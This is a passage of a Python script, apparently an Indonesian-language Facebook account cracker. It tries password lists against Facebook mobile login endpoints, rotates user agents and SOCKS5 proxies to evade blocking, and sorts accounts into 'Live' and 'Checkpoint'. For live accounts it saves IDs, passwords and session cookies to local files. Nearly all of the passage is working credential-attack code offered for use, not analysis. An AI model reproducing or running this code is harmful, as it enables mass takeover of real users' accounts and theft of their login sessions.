	 )
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': cuoz}, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				#print(f'\r{P} => {M}{idf}|{pw} => {nmf} => {url} => {tahun(idf)}{N}')
				cp+=1
				os.popen('play-audio Data/Audio/CP.mp3')
				rescp = nel.fit(f'{K2}Checkpoint')
				rescp1 = nel.fit(f'{K2}{idf}')
				rescp2 = nel.fit(f'{K2}{pw}')
				rescp3 = nel.fit(f'{K2}{nmf}')
				rescp4 = nel.fit(f'{K2}{tahun(idf)}')
				rescp5 = nel(f'{K2}{ua}',width=60)
				columns = Columns([rescp1,rescp2])
				tree = Tree(rescp)
				tree.add(columns)
				tree.add(rescp4)
				tree.add(rescp5)
				console.print(tree)
				open('Checkpoint/'+cpc,'a').write(idf+'<=>'+pw+'\n')
				with open('Checkpoint/'+cpc,'a') as wr:
				  wr.write(cpc+'\n')
				  wr.close()
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				os.popen('play-audio Data/Audio/Live.mp3')
				resok = nel.fit(f'{H2}Live')
				resok1 = nel.fit(f'{H2}{idf}')
				resok2 = nel.fit(f'{H2}{pw}')
				resok3 = nel.fit(f'{H2}{nmf}')
				resok4 = nel.fit(f'{H2}{tahun(idf)}')
				resok5 = nel(f'{H2}{ua}',width=60)
				resok6 = nel(f'{H2}{kuki}',width=60)
				columns = Columns([resok1,resok2])
				tree = Tree(resok)
				tree.add(columns)
				tree.add(resok4)
				tree.add(resok5)
				tree.add(resok6)
				console.print(tree)
				open('Live/'+okc,'a').write(idf+'<=>'+pw+'<=>'+kuki+'<=>'+ua+'\n')
				with open('Live/'+okc,'a') as wr:
				  wr.write(okc+'\n')
				  wr.close()
				ok+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1

# <------[ Async ]------>
def crack3(idf,pwv,nmf):
	global loop,ok,cp
	#sys.stdout.write(f"\r{P} {N}{'{:.0%}'.format(loop/float(len(id)))} {(loop)}={len(id)} {idf} {H}{(ok)}{N}={M}{(cp)}{N} "),sys.stdout.flush()
	looping2 = coy(f"{P2}[{warna2}Async{P2}] Crack Berjalan [{warna2}{len(id)}{P2}/{warna2}{(loop)}{P2}] Live:-{H2}{(ok)}{P2} Check:-{K2}{(cp)}{P2}{M2} › {warna2}{'{:.0%}'.format(loop/float(len(id)))}{P2} [{H2}{idf}{P2}]", end='\r');sys.stdout.flush()
	# sys.stdout.write(f"\r {P}[{warna}Async{P}] Crack Berjalan [{warna}{len(id)}{P}/{warna}{(loop)}{P}] Live:-{H}{(ok)} {P}/ Check:-{K}{(cp)}{P} [{warna}{'{:.0%}]'.format(loop/float(len(id)))}{P} [{H}{idf}{P}]"),sys.stdout.flush()
	ua, ua2 = Ugen(),Ugen2()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "free.prod.facebook.com","cache-control": "max-age=0","user-agent": ua2,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-dest": "document","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://free.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df2b70837-684f-4f50-abec-6cef1b16e764%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'true', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.15625; wd=501x950'
			heade={
			"Host": "free.prod.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://free.prod.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df2b70837-684f-4f50-abec-6cef1b16e764%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://free.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cp+=1
				os.popen('play-audio Data/Audio/CP.mp3')
				rescp = nel.fit(f'{K2}Checkpoint')
				rescp1 = nel.fit(f'{K2}{idf}')
				rescp2 = nel.fit(f'{K2}{pw}')
				rescp3 = nel.fit(f'{K2}{nmf}')
				rescp4 = nel.fit(f'{K2}{tahun(idf)}')
				rescp5 = nel(f'{K2}{ua}',width=60)
				columns = Columns([rescp1,rescp2])
				tree = Tree(rescp)
				tree.add(columns)
				tree.add(rescp4)
				tree.add(rescp5)
				console.print(tree)
				open('Checkpoint/'+cpc,'a').write(idf+'<=>'+pw+'\n')
				with open('Checkpoint/'+cpc,'a') as wr:
				  wr.write(cpc+'\n')
				  wr.close()
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				ok+=1
				os.popen('play-audio Data/Audio/Live.mp3')
				resok = nel.fit(f'{H2}Live')
				resok1 = nel.fit(f'{H2}{idf}')
				resok2 = nel.fit(f'{H2}{pw}')
				resok3 = nel.fit(f'{H2}{nmf}')
				resok4 = nel.fit(f'{H2}{tahun(idf)}')
				resok5 = nel(f'{H2}{ua}',width=60)
				resok6 = nel(f'{H2}{kuki}',width=60)
				columns = Columns([resok1,resok2])
				tree = Tree(resok)
				tree.add(columns)
				tree.add(resok4)
				tree.add(resok5)
				tree.add(resok6)
				console.print(tree)
				open('Live/'+okc,'a').write(idf+'<=>'+pw+'<=>'+kuki+'<=>'+ua+'\n')
				with open('Live/'+okc,'a') as wr:
				  wr.write(okc+'\n')
				  wr.close()
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1

# <------[ Tahun ]------>
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:
		  tahunz='2023-2024'
	elif len(fx) in [9,10]:tahunz = '2008'
	elif len(fx)==8:tahunz = '2007'
	elif len(fx)==7:tahunz = '2006'
	else:
	  tahunz='2023-2024'
	return tahunz
	
# <------[ Running ]------>
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('Live')
	except:pass
	try:os.mkdir('Checkpoint')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	Menu()
